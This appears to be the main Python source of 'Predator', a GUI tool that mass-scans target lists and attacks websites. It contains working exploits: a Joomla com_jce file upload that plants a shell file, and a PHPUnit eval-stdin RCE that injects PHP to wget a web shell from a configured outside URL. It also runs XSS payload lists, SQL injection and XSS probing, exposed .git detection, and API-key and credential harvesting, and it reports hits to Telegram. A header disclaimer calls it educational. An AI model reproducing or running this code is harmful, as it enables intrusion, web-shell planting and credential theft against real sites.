############################## 
#  ()()                ____  #
#  (..)               /|o  | #
#  /\/\  @mr_0x01    /o|  o| #
# c\db/o............/o_|_o_| #                                                             
##############################
""" 
Copyright © 2023 Predator. All rights reserved.

This Python script and its accompanying documentation are my original creations 
and are protected by copyright law. Unauthorized reproduction, distribution, or 
modification of this script is strictly prohibited and may result in legal action.

This script is intended for educational purposes only and I do not condone or
support its use for any illegal or malicious activities. 
Please note that the script is provided "as is," without warranty of any kind.

Thank you for respecting my work.
"""
import sys
import os
import time
import threading
import re
import html
import json
import shutil
import datetime
import requests
import rstr
import smtplib
import webbrowser
import customtkinter
import itertools
import pyperclip
import base64
import pyclip
import copy
import pprint as pp
import ctypes
import winshell
import string
import phonenumbers
import parawrap
import boto3
import platform
import socket
import psutil
import ast
import random
from random import choice as Xchoice
from rich import print
from rich.table import Table
from rich.console import Console
from rich.traceback import install
from phonenumbers import carrier, geocoder, timezone
from deep_translator import MyMemoryTranslator
from datetime import date
from tkinter import messagebox, filedialog
from gtts import gTTS
from re import findall as reg
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont, ImageTk
from CTkMenuBar import *
from email.message import EmailMessage
from preferredsoundplayer import *
from selenium import webdriver
from plyer import notification
from time import perf_counter
from tkinter.colorchooser import askcolor
from faker import Faker
from Decrypter import Decrypter
from CTkScrollableDropdown import *
from pkg_resources import parse_version
from socket import create_connection
from urllib3 import PoolManager, disable_warnings
disable_warnings()
from urllib.parse import quote
from io import BytesIO

install()
console = Console()

sys.setrecursionlimit(2000)
CheckF = ['Result', 'Result/Laravel', 'Result/cms', 'Result/Grabber', 'Result/Possible', 'Result/Reversed', 'Result/SubFinder', 'Result/SmtpChecker', 'Result/Generator', 'Result/NetGun', 'Result/AWS', 'Result/TwilioChecker', 'tmp']

for fld in CheckF:
    if not os.path.isdir(fld):
        os.mkdir(fld)
try:
    with open('core/settings.json', 'r', encoding='utf-8') as XdB:
        ZdB = json.load(XdB)
        DefaultTheme = (ZdB['theme'])
except Exception as err:
    console.print_exception(show_locals=True)
    DefaultTheme = "System"

customtkinter.set_appearance_mode(DefaultTheme)
customtkinter.set_default_color_theme('theme.json')

app_logo = customtkinter.CTkImage(light_image=Image.open("core/logo.png"), dark_image=Image.open("core/logo.png"), size=(180, 180))
settings_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/settings.png"), dark_image=Image.open("core/icons/settings.png"), size=(30, 30))
theme_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/theme.png"), dark_image=Image.open("core/icons/theme.png"), size=(30, 30))
folder_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/folder.png"), dark_image=Image.open("core/icons/folder.png"), size=(30, 30))
donate_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/donate.png"), dark_image=Image.open("core/icons/donate.png"), size=(30, 30))
ai_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/ai.png"), dark_image=Image.open("core/icons/ai.png"), size=(50, 50))
debug_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/debug.png"), dark_image=Image.open("core/icons/debug.png"), size=(30, 30))

######COINS ICONS######
btc_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/btc.png"), dark_image=Image.open("core/icons/btc.png"), size=(30, 30))
eth_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/eth.png"), dark_image=Image.open("core/icons/eth.png"), size=(30, 30))
ltc_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/ltc.png"), dark_image=Image.open("core/icons/ltc.png"), size=(30, 30))
doge_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/doge.png"), dark_image=Image.open("core/icons/doge.png"), size=(30, 30))
bch_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/bch.png"), dark_image=Image.open("core/icons/bch.png"), size=(30, 30))
dash_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/dash.png"), dark_image=Image.open("core/icons/dash.png"), size=(30, 30))
dgb_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/dgb.png"), dark_image=Image.open("core/icons/dgb.png"), size=(30, 30))
trx_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/trx.png"), dark_image=Image.open("core/icons/trx.png"), size=(30, 30))
usdt_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/usdt.png"), dark_image=Image.open("core/icons/usdt.png"), size=(30, 30))
fey_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/fey.png"), dark_image=Image.open("core/icons/fey.png"), size=(30, 30))
zec_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/zec.png"), dark_image=Image.open("core/icons/zec.png"), size=(30, 30))
bnb_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/bnb.png"), dark_image=Image.open("core/icons/bnb.png"), size=(30, 30))
sol_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/sol.png"), dark_image=Image.open("core/icons/sol.png"), size=(30, 30))
xrp_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/xrp.png"), dark_image=Image.open("core/icons/xrp.png"), size=(30, 30))
matic_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/matic.png"), dark_image=Image.open("core/icons/matic.png"), size=(30, 30))

######DONATE VARS######
donate_coins = [eth_icon, ltc_icon, doge_icon, bch_icon, dash_icon, dgb_icon, trx_icon, usdt_icon, fey_icon, zec_icon, bnb_icon, sol_icon, xrp_icon, matic_icon]

######HEADERS######
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Content-type' : '*/*',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://evil.com',
}

######GLOBAL VALUES######
gdead = 0
totalrm = 0
mailerError = 0
startNum = 0 #Pregress Value
totalInBegin = 0 #Pregress Value
limitx = 0 
revip_bots = 3
subf_bots = 3
threadingvalue = 5
gtimeout=10
gstop = 'false'
revip_gstop = 'false'
subf_gstop = 'false'
lrvlgrabstop = 'false'
stopMailer = 'false'
stopSmtpChecker = 'false'
ipgenAmount = 50000
protocol = 'http://'
OneBot = True
smtpCheckerOneBot = True
MailerOneBot = True
CoolWaitStop = False #Generator Cool wait
MailerBots = 5

######INSCOPE######
inScopeTargets = []
InScopeRevIP = []
inScopeSFinder = []
totalProxies = []
MailerSmtps = []
MailerEmails = []

######REGEX GEN######
regixGnAmount = 1000

######RESULT######
PhpUnitRCE = 0
envres = 0
xssres = 0
sqlres = 0
cors_res = 0
gitres = 0
comJceres = 0 # com_jce results
gthosts = 0 # Reverse IP dynamic result
gsubf = 0 #SubFinder
sentCount = 0 #Mailer
ValidSmtps = 0 #SMTP CHecker
BadSmtps = 0 #SMTP CHecker
TotalSmtpsHits = 0 #Laravel Leaked smtps
TotalTwilioHits = 0 #Laravel Leaked Twilio
TotalDBsHits = 0 #Laravel Leaked DBs
TotalAwsHits = 0 #Laravel Leaked AWS
TotalClicksendHits = 0 #Laravel Leaked ClickSend
TotalOsHits = 0 #Laravel Leaked OneSignal
TotalSmsHits = 0 #Laravel Leaked SMS
TotalStripeHits = 0 #Laravel Leaked Stripe
TotalRazorpayHits = 0 #Laravel Leaked RazorPay
TotalpaypalLHits = 0 #Laravel Leaked PP LIVE
TotalpaypalSHits = 0 #Laravel Leaked PP SANDBOX

######Payloads######
xss_payloads = ['<xss onafterscriptexecute=alert(1)><script>1</script>', '<xss onbeforescriptexecute=alert(1)><script>1</script>', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', '<div menuid=”batman” onmouseover=alert(1)> ”> </div>', '"><img src=xx onerror=alert(document.domain)>', '"><strong><script>alert(document.domain)</script><font color="green" size=15px>Predator</font></strong>', '"><script>alert("Predator")</script><marquee>XSS</marquee>', '{"><img src=xx onerror=alert("Predator")>"}', '"><menu id=xx contextmenu=xx onshow=alert(document.domain)> click me!', '"><x onclick=alert(document.domain)><button>click this!</button>']

def consolelog(reason, msg):
    console.log(f"[{reason}] {msg}")

class Predator(customtkinter.CTk):

    def __init__(self):
        super().__init__()
  
        def sstrun():  
            worker_thread = threading.Thread(target=sst)
            worker_thread.daemon = True
            worker_thread.start()
            # worker_thread.join()

        def getjson_data(xdata):
            try:
                with open('core/exploits/db.json', 'r', encoding='utf-8') as included_imports:
                    db = json.load(included_imports)
                    xdata = (db[xdata])
            except Exception as e:
                console.print_exception(show_locals=True)
                return self.self.show_error('Error!', e)
        
            return xdata

        def sst():
            global threadingvalue
            global gtimeout
            global gstop
            global protocol
            global inScopeTargets
            global OneBot
            global startNum
            global totalInBegin
            global limitx

            threadnum = int(threadingvalue)

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                # self.start_button.configure(text='Start', command=sstrun, state="normal")
                # return self.after_idle(self.show_error, 'Error!', 'Exploit/Bug is required! Add from Settings.')
                return self.escapex1()
            
            if threadnum != 0:
                pass
            else:
                return self.show_error('Error!', 'Threads Value Required')
            
            if gtimeout != 0:
                pass
            else:
                return self.show_error('Error!', 'Timeout Value required')
            
            try:
                with open('core/settings.json', 'r', encoding='utf-8') as ssDB:
                    zssDB = json.load(ssDB)
                    tmProtocol = (zssDB['protocol'])
            except Exception as err:
                console.print_exception(show_locals=True)
                console.print_exception(show_locals=True)
                return self.show_error('Error!', err)

            protocol = tmProtocol #GLOBAL PROTOCOL
            
            gstop = 'false'      
            inScopeTargets = []

            with open('core/txt/targets.txt', 'r', encoding="utf-8") as f:
                inScopeTargets = list(f)

            self.escapex2()

            x65x = len(inScopeTargets)

            if x65x > 999999:
                x65x = "+999999"
            
            # self.apTargets.configure(text=f"InScope: {x65x}")
 
            consolelog("INFO", 'starting...')

            OneBot = True

            self.start_time = perf_counter()

            #updateProgress()
            startNum = 0
            totalInBegin = len(inScopeTargets)
            limitx = 0
            
            return start_scan()
            
        def rand_target():
            global inScopeTargets

            if len(inScopeTargets) == 0:
                return "Stop"
            
            target = Xchoice(inScopeTargets)

            target = target.replace('\n', '')

            # if target in self.InscoTargets:
            #     return None
            # else:
            #     self.InscoTargets.append(f"{target}")

            return target

        def xssHunt(url):
            global xssres
            global gdead
            global gtimeout
            global xss_payloads
            global gstop

            if gstop == 'true':
                return True

            payload = '"><h1>mr0x01</h1>'
            target = f'{url}/?query={payload}&s={payload}&search={payload}&q={payload}'

            consolelog("INFO", f'Scanning XSS > {url}')
            
            try:
                response = requests.get(target, timeout=gtimeout)
            except Exception as err:
                consolelog('INFO', err)
                return False

            # Check if the payload is reflected in the response
            if '<h1>mr0x01</h1>' in response.text:
                if response.status_code == 200:

                    xssres += 1
                    self.xssbox.configure(text=f'XSS: {xssres}')
                    with open('Result/XSS.txt', "a+", encoding="utf-8") as f:
                            f.write(target + '\n')

                    self.HitSound()
                    
                    return True

            else:
                
                target2 = f'{url}/search?query={payload}&s={payload}&search={payload}&q={payload}'
            
                response2 = requests.get(target2, timeout=gtimeout)

                if '<h1>mr0x01</h1>' in response2.text:
                    if response2.status_code == 200:

                        xssres += 1
                        self.xssbox.configure(text=f'XSS: {xssres}')

                        with open('Result/XSS.txt', "a+", encoding="utf-8") as f:
                            f.write(target2 + '\n')

                        self.HitSound()   
       
                        return True
           
        def checkGit(target, endp):
            global gitres

            if gstop == 'true':
                return

            try:
                url = target + endp

                GetConfig = requests.get(url, headers=HEADERS, timeout=gtimeout)

                if "Checking Browser" in GetConfig.text:
                    return False    
                elif GetConfig.status_code == 404:
                    return False
                elif GetConfig.status_code == 403:
                    return False
                else:
                    if "repositoryformatversion" in GetConfig.text:

                        with open('Result/.git.txt', 'a', encoding="utf-8") as f:
                            f.write(f"{url}\n")

                        self.send_to_telegram(f"🤗GIT\n<code>{url}</code>")
                        

                        self.HitSound()
        
                        gitres += 1
                        self.Notif(f"GIT: {gitres}")
                        self.gitbox.configure(text=f'GIT: {gitres}')

                        gittextbox = customtkinter.CTkTextbox(self.git_frame, width=500, height=30)
                        gittextbox.grid(row=envres, column=0, sticky="nsew")
                        gittextbox.insert("0.0", f"{url}")
                        self.git_frame_switches.append(gittextbox)

                        
                        self.auto_function()

            except Exception as err:
                consolelog('INFO', err)

        def ParamsGrabber(site, stype):
            global gtimeout
            global gstop

            if gstop == 'true':
                return

            TargetParams = []

            blacklist_sites = []

            try:
                with open('core/txt/Blacklist.txt', 'r', encoding='utf-8') as f:
                    for line in f:
                        linex = line.replace('\n', '')
                        if len(linex) > 1:
                            blacklist_sites.append(linex)

            except Exception as err:
                console.print_exception(show_locals=True)
                consolelog('ERROR', err)

            try:
                GetLink = requests.get(site, timeout=gtimeout, headers=HEADERS)  
            except Exception as err:
                return consolelog("INFO", f'{site} > {err}')

            urls_tmp = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))
            
            if len(urls_tmp) != 0:
                for url in urls_tmp:
                    if '?' in url:
                        if '=' in url: 
                            if url not in TargetParams:
                                url = url.replace('\n', '')

                                isBad = False
                                for xbk in blacklist_sites:
                                    if xbk in url:
                                        isBad = True
                                        break         
                                
                                if isBad == False:
                                    TargetParams.append(url)
            else:  
                consolelog("INFO", f"{site} > Could not find params with 'href='")
            
            urls2_tmp = re.findall('action=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))

            if len(urls2_tmp) != 0:
                for url2 in urls2_tmp:
                    if '?' in url2:
                        if '=' in url2:        
                            if url2 not in TargetParams:
                                url2 = url2.replace('\n', '')

                                isBad = False
                                for xbk in blacklist_sites:
                                    if xbk in url2:
                                        isBad = True
                                        break         
                                
                                if isBad == False:
                                    TargetParams.append(url2)

            else:  
                consolelog("INFO", f"{site} Could not find params with 'action='")

            urls3_tmp = re.findall('src=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))


            if len(urls3_tmp) != 0:
                for url3 in urls3_tmp:

                    if '?' in url3:
                        if '=' in url3:
                            if url3 not in TargetParams:
                                url3 = url3.replace('\n', '')

                                isBad = False
                                for xbk in blacklist_sites:
                                    if xbk in url3:
                                        isBad = True
                                        break         
                                
                                if isBad == False:
                                    TargetParams.append(url3)

            else:  
                consolelog("INFO", f"{site} > Could not find params with 'src='")                

            if len(TargetParams) != 0:
            
                total_params = len(TargetParams)

                consolelog("INFO", f'{site} > InScope Params: [{total_params}]')  
                if TargetParams != 0:
                    # for Parm in TargetParams:
                    ParamSender(site, TargetParams, stype) 
    
        def com_jce(url):
            global comJceres

            endpoint = f"{url}/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"
            data = {'upload-dir':'./../../','upload-overwrite':0,'Filedata' : [open('core/shell/Predator.gif','rb')],'action':'Upload',}
            PostShell = requests.post(url=endpoint, data=data, verify=False)

            if "Checking Browser" in PostShell.text:
                return False    
            elif PostShell.status_code == 404:
                return False
            elif PostShell.status_code == 403:
                return False
            elif PostShell.status_code == 401:
                return False

            dump_data = f"{url}/Predator.gif"
            res = requests.get(url=dump_data, timeout=20).text
            matches = re.findall(re.compile(r'/image/gif/'),res)

            if matches:
                with open('Result/com_jce.txt', 'a', encoding="utf-8") as f:
                    f.write(f"{url}/Predator.gif\n")

                self.send_to_telegram(f"🤗com_jce [Joomla]\n<code>{url}/Predator.gif</code>")
                
                self.HitSound()
                comJceres += 1
                self.com_jcebox.configure(text=f'com_jce: {comJceres}')

                comJcetextbox = customtkinter.CTkTextbox(self.com_jceres_frame, width=500, height=30)
                comJcetextbox.grid(row=comJceres, column=0, sticky="nsew")
                comJcetextbox.insert("0.0", f"{url}/Predator.gif")
                self.com_jceres_frame_switches.append(comJcetextbox)

                self.Notif(f"com_jce: {comJceres}")
                
                self.auto_function()
    
        def PHPUnitRCE(target):
            global gdead
            global PhpUnitRCE
            global gtimeout
            global gstop

            if gstop == 'true':
                return
            
            url = target

            try:
                with open('core/phpunitrce.json', 'r', encoding='utf-8') as xf:
                    xfdb = json.load(xf)
                    ShellUrl = (xfdb['ShellUrl'])
                    ShellKeyCheck = (xfdb['ShellKeyCheck'])
            except Exception as err:
                console.print_exception(show_locals=True)
                return console.print_exception(show_locals=True)
            
            inject = f'<?php system("wget {ShellUrl} -O Predator.php"); ?>'
            try:
                response = requests.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', headers=HEADERS, data=inject, timeout=gtimeout)        
            except Exception as err:
                return consolelog('INFO', err)

            CheckShell = requests.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Predator.php', timeout=5).text
            if ShellKeyCheck in CheckShell:
                    
                vulnpoint = F"{url}/vendor/phpunit/phpunit/src/Util/PHP/Predator.php"
                with open('Result/Laravel/PHPUnitRCE.txt', 'a', encoding="utf-8") as f:
                    f.write(f"{vulnpoint}\n")
                
                self.send_to_telegram(f"🤗PHPUnitRCE\n<code>{vulnpoint}</code>")
                
                PhpUnitRCE += 1
                self.HitSound()

                self.Notif(f"PHPUnitRCE: {PhpUnitRCE}")
                self.phpubox.configure(text=f'PHPUnitRCE: {PhpUnitRCE}')

                rownum = PhpUnitRCE - 1
                rcetextbox = customtkinter.CTkTextbox(master=self.lrvrceres_frame, width=500, height=30, corner_radius=5)
                rcetextbox.grid(row=rownum, column=0, sticky="nsew")
                rcetextbox.insert("0.0", f"{vulnpoint}")
                rcetextbox.configure(state="disabled")
                self.lrvrceres_frame_switches.append(rcetextbox)

                self.auto_function()

        def CheckSqli(url):
            global gtimeout
            global sqlres
            global gstop

            if gstop == 'true':
                return True
            
            try:
                # new_url = url.replace("=", "='_'")

                new_url = f"{url}'_"
                Checksqli = requests.get(new_url, timeout=gtimeout, headers=HEADERS).text
           
            except Exception as err:
                return False


            errors = []

            if 'Request ID:' in Checksqli:
                return False
            
            try:
                with open('core/txt/SQL.txt', 'r', encoding='utf-8') as f:
                    for xsite in f:
                        xsite2 = xsite.replace('\n', '')
                        if len(xsite2) > 1:
                            if xsite2 not in errors:
                                errors.append(xsite2)

            except Exception as err:
                console.print_exception(show_locals=True)
                consolelog('ERROR', err)
            
            for err in errors:
                if err in Checksqli:
                    try:
                        # new_url = url.replace("=", "='_'")

                        check_url = f"{url}"
                        reChecksqli = requests.get(check_url, timeout=gtimeout, headers=HEADERS).text

                        for err in errors:
                            if err in reChecksqli:
                                return False
                   
                    except Exception as err:
                        return False
                
                    with open('Result/SQL.txt', "a+", encoding="utf-8") as f:
                        f.write(f"{new_url}\n")

                    sqlres += 1
                    self.sqlbox.configure(text=f'SQL: {sqlres}')
                    self.HitSound()

                    def copysql():
                        data = sqltextbox.get("0.0", "end")
                        pyperclip.copy(data)
                        return self.show_checkmark('Success', 'Text copied to clipboard.')

                    def opensql():
                        link = sqltextbox.get("0.0", "end")
                        webbrowser.open(link, new=1, autoraise=True)

                    def deletesql():
                        ActionsBox.grid_forget()
                        sqltextbox.grid_forget()

                    def doaction(value):
                        if value == "Copy":
                            return copysql()
                        elif value == "Open":
                            return opensql()
                        elif value == "Delete":
                            return deletesql()
                        elif value == "Blacklist":
                            print('Blacklist')


                    self.send_to_telegram(f"🤗SQL\n<code>{new_url}</code>")
                    self.Notif(f"SQL: {sqlres}")

                    # btnsFrame = customtkinter.CTkFrame(self.sqlres_frame, height=30, corner_radius=0)
                    # btnsFrame.grid(row=sqlres, column=1, sticky="nsew")
                    
                    ActionsBox = customtkinter.CTkOptionMenu(self.sqlres_frame, values=["Copy", "Open", "Delete", "Blacklist"], button_color="red", fg_color="red", text_color="black", button_hover_color="green", command=doaction)
                    ActionsBox.grid(row=sqlres, column=1, sticky="nsew")
                    # SQLCopyResBtn = customtkinter.CTkButton(master=btnsFrame, text="Copy", command=copysql, width=50, border_width=0, corner_radius=0)
                    # SQLCopyResBtn.grid(row=0, column=0)
                    # SQLOpenResBtn = customtkinter.CTkButton(master=btnsFrame, text="Open", command=opensql, width=50, border_width=0, corner_radius=0)
                    # SQLOpenResBtn.grid(row=0, column=1)
                    # SQLDeleteResBtn = customtkinter.CTkButton(master=btnsFrame, text="Delete", command=deletesql, width=50, border_width=0, corner_radius=0)
                    # SQLDeleteResBtn.grid(row=0, column=2)

                    sqltextbox = customtkinter.CTkTextbox(self.sqlres_frame, height=30, corner_radius=0)
                    sqltextbox.grid(row=sqlres, column=0, sticky="nsew")
                    sqltextbox.insert("0.0", f"{check_url}")
                    
                    return True

        def CheckXSS(site):
            global xssres
            global gstop

            if gstop == 'true':
                return True

            url = site
            payload = '<h1>Predator v0.0.8</h1>'
            xssurl = url.replace("=", '="><h1>Predator v0.0.8</h1>')

            try:
                XssTrigger = requests.get(xssurl, timeout=gtimeout, headers=HEADERS)
                boom = str(XssTrigger.text)
                heee = str(XssTrigger.headers)
            except Exception as err:
                consolelog("INFO", f'{xssurl} > {err}')
                return False
                
            if 'application/problem+json' in heee:
                return False 
            
            elif 'application/json' in heee:
                return False
            
            if payload in boom:
                with open('Result/XSS.txt', "a+", encoding="utf-8") as f:
                    f.write(xssurl + '\n')

                xssres += 1
                self.xssbox.configure(text=f'XSS: {xssres}')

                def copyxss():
                    data = xsstextbox.get("0.0", "end")
                    pyperclip.copy(data)
                    return self.show_checkmark('Success', 'Text copied to clipboard.')

                def openxss():
                    link = xsstextbox.get("0.0", "end")
                    webbrowser.open(link, new=1, autoraise=True)

                def deletexss():
                    xssbtnsFrame.grid_forget()
                    xsstextbox.grid_forget()

                xsstextbox = customtkinter.CTkTextbox(self.xssres_frame, height=30, corner_radius=0)
                xsstextbox.grid(row=xssres, column=0, sticky="nsew")
                xsstextbox.insert("0.0", f"{xssurl}")

                xssbtnsFrame = customtkinter.CTkFrame(self.xssres_frame, height=30, corner_radius=0)
                xssbtnsFrame.grid(row=xssres, column=1, sticky="nsew")
                
                xssCopyResBtn = customtkinter.CTkButton(master=xssbtnsFrame, text="Copy", command=copyxss, width=50, border_width=0, corner_radius=0)
                xssCopyResBtn.grid(row=0, column=0)
                xssOpenResBtn = customtkinter.CTkButton(master=xssbtnsFrame, text="Open", command=openxss, width=50, border_width=0, corner_radius=0)
                xssOpenResBtn.grid(row=0, column=1)
                xssDeleteResBtn = customtkinter.CTkButton(master=xssbtnsFrame, text="Delete", command=deletexss, width=50, border_width=0, corner_radius=0)
                xssDeleteResBtn.grid(row=0, column=2)

                self.HitSound()
                    
                consolelog('INFO', f"{xssurl} > XSS > Vulnerable")
                return True

        def ParamSender(site, urls, stype):
            global gstop

            try:

                for url in urls:
                    if gstop == 'true':
                        return

                    url = url.replace('#', '')
        
                    if "?" in str(url):
                        if '=' in url:          
                            if '://' in url:
                                xyz = str(url)
                            else:
                                if '/' in url:
                                    xyz = site + str(url)
                                else:
                                    xyz = site + '/' + str(url)

                            OpenRVar = self.getjson_data('OpenRedirect')
                            if OpenRVar == 'on':
                                with open('core/txt/OpenRedirect.txt', 'r', encoding="utf-8") as f:
                                    pParams = list(f)

                                consolelog("INFO", f'{url} > Scanning Possible Open Redirect...')

                                for xp in pParams:
                                    xp = xp.replace('\n', '')
                                    if len(xp) > 1:    
                                        if xp in xyz:
                                            with open('Result/Possible/OpenRedirect.txt', "a+", encoding="utf-8") as f:
                                                f.write(f'{xyz}\n')

                                            consolelog("INFO", f'{url} > Possible Open Redirect > {xyz}')
                            
                            if stype == 'SQL':
                                if CheckSqli(xyz) == True:
                                    return

                            elif stype == 'XSS':
                                if CheckXSS(xyz) == True:
                                    return
            
            except Exception as err:
                return consolelog("INFO", err)

        def detect(url):
            global gtimeout
            global cors_res
            global gstop

            if gstop == 'true':
                return 

            #consolelog("INFO", f'Checking CMS... {url}')

            try:
                req = requests.get(url, headers=HEADERS, timeout=gtimeout)
                urlContent = req.text
        
                if 'challenge-form" action="/?__cf_chl_f' in urlContent:
                    name = 'WAF'
                    return name
                elif 'class="g-recaptcha"' in urlContent:
                    name = 'WAF'
                    return name
                
                if ap_value == "on":
                    consolelog("INFO", f'{url} > Scanning Possible apikeys...')
                    
                    leak = []

                    try:
                        with open('core/txt/apikeys.txt', 'r', encoding='utf-8') as f:
                            for bk in f:
                                if len(bk) > 1:
                                    bk2 = bk.replace('\n', '')
                                    if bk2 not in leak:
                                        leak.append(bk2)

                    except Exception as err:
                        return consolelog('ERROR', err)
                        
                    for key in leak:
                        if key in urlContent:
                            with open('Result/Possible/apikeys.txt', "a+", encoding="utf-8") as f:
                                f.write(f'view-source:{url}#{key}\n')

                            consolelog("INFO", f'{url} > Possible Api Key > {key}')
            
                if cors_value == "on":
                
                    if 'evil.com' in str(req.headers):
                        with open('Result/CORS.txt', 'a', encoding="utf-8") as f:
                            f.write(f'{url}\n')

                        self.HitSound()
                        
                        cors_res += 1      
                        self.corsbox.configure(text=f'CORS: {cors_res}')
                        self.auto_function()

                        roww = cors_res - 1

                        self.appendcorsres(roww, url)
                        
                if re.search(re.compile(r'wp-content|wordpress|xmlrpc.php'), urlContent):
                    
                    #print(f"{PURPLE}> {RESET}CMS {RED}> {LIGHTRED} Wordpress{RESET}")
                    plugins_re = r"\/wp-content\/plugins\/(.*?)\/"
                    themes_re = r"\/wp-content\/themes\/(.*?)\/"         
                    plugins_tmp = re.findall(plugins_re, urlContent)
                    themes_tmp = re.findall(themes_re, urlContent)
                    plugins = list(set(plugins_tmp))
                    themes = list(set(themes_tmp))
        
                    #print(plugins)
                    #print(f"{PURPLE}> {RESET}Plugins {RED}=> {CYAN} {plugins}")
                    #print(f"{PURPLE}> {RESET}Themes {RED}=> {CYAN} {themes}")
                    #print(themes)
                    
                    # for plugin in plugins:
                    #     if 'viral-optins' in plugin:
                    #         #fileup(url)
                    #         print('no exploit yet')
                    #     elif 'hd-webplayer' in plugin:
                    #         marwan(url)
                    #     elif 'revslider' in plugin:
                    #         revslidercss(url)
                    #         CVE_2014_9735(url)
                    #         CVE_2015_1579(url)
                    #     elif 'wpSS' in plugin:
                    #         Spreedsheet(url)
                    #     elif 'photo-gallery' in plugin:
                    #         photog(url)
                    #     elif 'eshop-magic' in plugin:
                    #         eshop(url)
                    #     elif 'wp-miniaudioplayer' in plugin:
                    #         miniaudioplayer(url)
                    #     elif 'wp-support-plus-responsive-ticket-system' in plugin:
                    #         wsprts(url)
                    #     elif 'ungallery' in plugin:
                    #         ungallery(url)
                    #     elif 'cherry-plugin' in plugin:
                    #         wp_cherry(url)
                    #     elif 'woocommerce' in plugin:
                    #         woocommerce(url)
                    #     elif 'simple-fields' in plugin:
                    #         simple(url)
                    #     elif 'media-library-assistant' in plugin:
                    #         MediaLib(url)
                    #     elif 'category-page-icons' in plugin:
                    #         morocco(url)
                    #     elif 'cloudflare' in plugin:
                    #         CVE_2017_9841(url)
                    #     elif 'downloads-manager' in plugin:
                    #         CVE_2008_3362(url)
        
                    name = 'Wordpress'
                    with open('Result/cms/Wordpress.txt', "a+", encoding="utf-8") as f:
                        f.write(url + '\n')
                    return name 
        
                elif re.search(re.compile(r'<script type=\"text/javascript\" src=\"/media/system/js/mootools.js\"></script>|/media/system/js/|com_content|Joomla!'), urlContent):
                    name = 'Joomla'
                    with open('Result/cms/Joomla.txt', "a+", encoding="utf-8") as f:
                        f.write(url + '\n')
                    return name
                
        
                elif re.search(re.compile(r'Drupal|drupal|sites/all|drupal.org'), urlContent):
                    name = 'Drupal'
                    with open('Result/cms/Drupal.txt', "a+", encoding="utf-8") as f:
                        f.write(url + '\n')
                    return name
                
                elif re.search(re.compile(r'Prestashop|prestashop'), urlContent):
                    name = 'Prestashop'
                    with open('Result/cms/Prestashop.txt', "a+", encoding="utf-8") as f:
                        f.write(url + '\n')
                    return name
                elif re.search(re.compile(r'route=product|OpenCart|route=common|catalog/view/theme'), urlContent):
                    name = 'Opencart'
                    with open('Result/cms/Opencart.txt', "a+", encoding="utf-8") as f:
                        f.write(url + '\n')
                    return name
        
                elif re.search(re.compile(r'Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento'), urlContent):
                    name = 'Magento'
                    with open('Result/cms/Magento.txt', "a+", encoding="utf-8") as f:
                        f.write(url + '\n')
                    return name
                
                else:
                    osCommerce = requests.get(url + '/admin/includes/general.js', headers=HEADERS, timeout=gtimeout).content
                    
                    if 'function SetFocus()' in str(osCommerce):
                        #print(f"{PURPLE}> {RESET}CMS {RED}=> {GREEN} osCommerce{RESET}")
                        name = 'osCommerce'
                        with open('Result/cms/osCommerce.txt', "a+", encoding="utf-8") as f:
                            f.write(url + '\n')
                        
                        return name
                
                    else:
                        vBulletin = url + '/images/editor/separator.gif'
                        vBull = requests.get(vBulletin, headers=HEADERS, timeout=gtimeout).content
                        if 'GIF89a' in str(vBull):
                            name = 'vBulletin'
                            with open('Result/cms/vBulletin.txt', "a+", encoding="utf-8") as f:
                                f.write(url + '\n')
                        
                            return name
                        
                        else:
                            name = 'Unknown'

                            with open('Result/cms/Unknown.txt', "a+", encoding="utf-8") as f:
                                f.write(url + '\n')

                            return name
        
            except Exception as err:
                consolelog('INFO', err)
                name = 'DeadServer'
                return name
                #Err(e)
        
        def serialize(url):
            global gstop

            result = dict(name=detect(url))

            return result
        
        def remove_target(target):
            global inScopeTargets
            
            try:
                inScopeTargets.remove(f'{target}\n')
            except Exception as err:
                consolelog('ERROR', err)             

        def stopshit():
            global OneBot
            global inScopeTargets

            if OneBot == True:
                OneBot = False

                self.start_button.configure(text="Start", command=sstrun, state="normal")
